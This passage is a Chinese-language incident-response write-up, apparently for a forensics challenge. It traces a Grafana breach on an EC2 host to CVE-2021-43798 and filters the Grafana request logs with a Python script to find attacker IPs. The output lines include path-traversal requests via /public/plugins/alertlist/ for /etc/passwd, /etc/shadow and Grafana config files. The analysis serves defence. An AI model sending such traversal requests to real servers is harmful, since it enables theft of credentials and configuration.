d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>由于 <code>Linux-CatScale</code> 会对一些目录下的文件进行压缩处理，所以开始处理之前先对每个文件夹下的压缩文件进行解压缩处理</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="#task-1" class="hash-link" aria-label="Task 1的直接链接" title="Task 1的直接链接">​</a></h2>
<blockquote>
<p>哪个 CVE 导致了 EC2 的初始妥协？</p>
</blockquote>
<p>在 <code>.\grafana\data\log\grafana.log.2022-11-18.001</code> 文件中，发现以下记录</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">.\grafana\data\log\grafana.log.2022-11-18.001</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">t=2022-11-17T14:40:55+0000 lvl=info msg=&quot;Request Completed&quot; logger=context userId=1 orgId=1 uname=admin method=GET path=/api/live/ws status=0 remote_addr=89.247.167.247 time_ms=1 size=0 referer=</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>借由关键词搜索，可以确定是 grafana 的漏洞，漏洞编号</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Answer</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CVE-2021-43798</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="#task-2" class="hash-link" aria-label="Task 2的直接链接" title="Task 2的直接链接">​</a></h2>
<blockquote>
<p>请详细说明威胁行为者（TA）用于针对我们组织的所有恶意 IP 地址。</p>
</blockquote>
<p>这里聚焦于 <code>grafana</code> 的日志文件进行分析</p>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>注意办公室的公网 ip 地址</div><div class="admonitionContent_BuS1"><p>需要注意的是，背景信息里面已经提供了办公室的公网 IP，应该在恶意名单内去除这个 ip 地址</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">86.5.206.121</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<p>首先，先使用 python 脚本筛选一下 web 访问的路径</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> index </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">18</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">25</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;./grafana.log.2022-11-{}.001&quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">index</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;r&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        log_data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    log_data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> log_data</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;\n&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> log_data</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;86.5.206.121&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;remote_addr&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Request Completed&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            info_1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;&quot;&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            info_2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> info_1</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">startswith</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;path&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&quot;remote_addr&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> info_2</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;path=/&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;path=/login&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;path=/api/search&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">info_1</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">info_2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 脚本输出的结果 </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/ remote_addr=89.247.167.247</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/user/password/reset remote_addr=89.247.167.247</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/live/ws remote_addr=89.247.167.247</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/etc/passwd remote_addr=89.247.167.247</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/live/ws remote_addr=89.247.167.247</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/live/ws remote_addr=89.247.167.247</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/live/ws remote_addr=89.247.167.247</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/live/ws remote_addr=89.247.167.247</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/live/ws remote_addr=89.247.167.247</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/live/ws remote_addr=89.247.167.247</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/grafana.ini remote_addr=89.247.167.247</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.24.61.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/ remote_addr=86.24.61.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.24.61.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/ remote_addr=86.24.61.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.24.61.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.24.61.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.24.61.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.24.61.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.24.61.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.24.61.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.24.61.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.24.61.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.24.61.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.31.99.194</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.31.99.194</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=85.255.236.29</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=213.205.198.177</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.24.61.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=92.40.168.226</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=86.24.222.206</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=62.254.9.100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=87.80.124.243</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=45.133.172.63</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=188.241.82.31</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=188.241.82.31</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=212.102.35.14</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=212.102.35.14</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=181.214.218.45</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=181.214.218.45</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=212.102.36.3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=156.146.60.29</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=156.146.60.29</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=216.24.213.40</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=194.32.122.58</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/ remote_addr=71.6.232.20</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/ remote_addr=193.118.53.210</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=193.118.53.210</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/ remote_addr=198.235.24.155</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=198.235.24.155</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=78.146.160.14</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/ remote_addr=205.210.31.132</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/ remote_addr=205.210.31.51</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=205.210.31.51</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=44.192.62.21</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=89.247.167.246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=89.247.167.246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/ remote_addr=89.247.167.246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/live/ws remote_addr=89.247.167.246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/avatar/46d229b033af06a191ff2267bca9ae56 remote_addr=89.247.167.246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/dashboards/home remote_addr=89.247.167.246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/search remote_addr=89.247.167.246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/plugins remote_addr=89.247.167.246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/search remote_addr=89.247.167.246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/search remote_addr=89.247.167.246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/search remote_addr=89.247.167.246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/search remote_addr=89.247.167.246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/frontend-metrics remote_addr=89.247.167.246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=87.80.124.243</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/ remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/ remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/ remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../etc/passwd remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../etc/passwd remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../etc/passwd remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../etc/passwd remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../etc/passwd remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../etc/passwd remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../etc/shadow remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/sample.ini remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/config/sample.ini remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/sample.ini remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/template.ini remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/default.ini remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/sample.ini remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/default.ini remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/public/plugins/alertlist/../../../../../../../../etc/passwd remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/ remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/login remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/ remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/avatar/46d229b033af06a191ff2267bca9ae56 remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/live/ws remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/dashboards/home remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/search remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/plugins remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/search remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/search remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/search remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/search remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/live/list remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/frontend-metrics remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/users/search remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/avatar/7948431d6e0557fd0c57d91a7cd50cad remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/dashboards/tags remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/search/sorting remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/search remote_addr=195.80.150.137</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Request Completed path=/api/search remote_addr=195.80.150.137</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>经过筛选，可以得到 ip 数据的集合</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">89.247.167.247     11</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">86.24.61.7         14</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">86.31.99.194       2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">85.255.236.29      1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">213.205.198.177    1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">92.40.168.226      1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">86.24.222.206      1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">62.254.9.100       1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">87.80.124.243      2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">45.133.172.63      1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">188.241.82.31      2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">212.102.35.14      2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">181.214.218.45     2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">212.102.36.3       1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">156.146.60.29      2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">216.24.213.40      1</span><br></span><span class="token-line" 